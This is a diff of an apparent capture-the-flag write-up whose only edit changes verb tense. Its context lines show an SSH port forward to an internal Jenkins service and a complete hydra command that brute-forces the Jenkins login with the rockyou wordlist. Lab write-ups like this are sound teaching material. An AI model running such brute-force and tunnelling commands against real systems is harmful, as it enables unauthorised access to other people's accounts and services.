@@ -130,7 +130,7 @@ ssh -N -L 5555:172.17.0.2:8080 aubreanna@10.10.61.56
 ```
 And if we navigate to localhost:5555, we got access to a jenkins webpage.
 
-Default credentials, or at least those that I knew of, were not working, so I'll capture the login request in burp, and then use hydra to try and bruteforce it.
+Default credentials, or at least those that I know of, are not working, so I'll capture the login request in burp, and then use hydra to try and bruteforce it.
 ```
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 5555 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
 ```
